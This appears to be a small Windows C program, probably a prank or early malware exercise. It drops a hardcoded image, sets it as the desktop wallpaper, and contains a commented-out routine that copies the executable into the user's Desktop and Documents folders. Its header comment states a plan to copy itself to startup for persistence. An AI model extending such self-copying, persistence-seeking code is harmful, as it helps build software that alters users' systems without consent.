/*
 * 1. Disover the path to desktop and documents folders
 * 2. Create a jpg from the hardcoded hex representation and change the desktop background
 * 3. Copy itself in /startup and test if it runs at startup
 */

#include "global.h"


BOOL retrieve_paths(void)
{
    DWORD status;

    if (!SHGetSpecialFolderPath(NULL, desktop_path, CSIDL_DESKTOP, FALSE))
    {
        printf("SHGetFolderPath - Desktop failed\n");
        return FALSE;
    }

    if (!SHGetSpecialFolderPath(NULL, docs_path, CSIDL_MYDOCUMENTS, FALSE))
    {
        printf("SHGetFolderPath - Documents failed\n");
        return FALSE;
    }

    strcat(desktop_path, JPG_NAME);
    strcat(docs_path, FILE_NAME);    

    status = GetModuleFileName(NULL, current_path, sizeof(current_path));
    if (status == 0)
    {
        printf("GetModuleFileName failed\n");
        return FALSE;
    }

    return TRUE;
}

void change_wallpaper(void)
{
    HANDLE hFile;
    FILE *fd;
    int results;

    fd = fopen(desktop_path, "wb");

    if (fd != NULL)
        fwrite(rawData, sizeof(rawData), 1, fd);

    fclose(fd);

    results = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void *)desktop_path, SPIF_UPDATEINIFILE);
}

BOOL file_stuff()
{
    CopyFileA(current_path, desktop_path, FALSE);

    CopyFileA(current_path, docs_path, FALSE);

    return TRUE;
}


int main()
{
	if (!retrieve_paths())
	{
		printf("Failed to retrieve paths\n");
		return -1;
	}
	
    change_wallpaper();


    /*printf("Performing operations on a file..\n");
    if (!file_stuff())
        printf("Failed\n");
    else printf("Done\n");*/


    return 0;
}